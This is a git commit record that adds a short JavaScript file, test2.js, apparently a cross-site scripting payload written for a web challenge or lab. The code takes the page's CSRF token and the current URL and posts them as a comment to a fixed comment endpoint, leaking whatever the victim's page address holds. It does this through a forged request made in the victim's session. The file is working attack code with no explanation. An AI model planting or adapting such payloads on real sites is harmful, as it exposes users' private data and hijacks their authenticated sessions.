c8e0549bc767df3a91daca7dc87a8d14d812086d
/hello <czavaleta93@gmail.com>
2021-11-03 19:59:36 -0500

    Create test2.js

---
+++ test2.js
@@ -0,0 +1,11 @@
+	var csrf = document.getElementsByTagName("input")[0].value;
+	var formData = new FormData();
+  var data = window.location.href;
+	formData.append("csrfmiddlewaretoken", csrf);
+	//formData.append("creator", "fromBot");
+	formData.append("body", data);
+
+	fetch("/comment/7dbf9521-4ba3-4498-8164-463404b7579d",{
+		method: 'POST',
+		body: formData
+	});
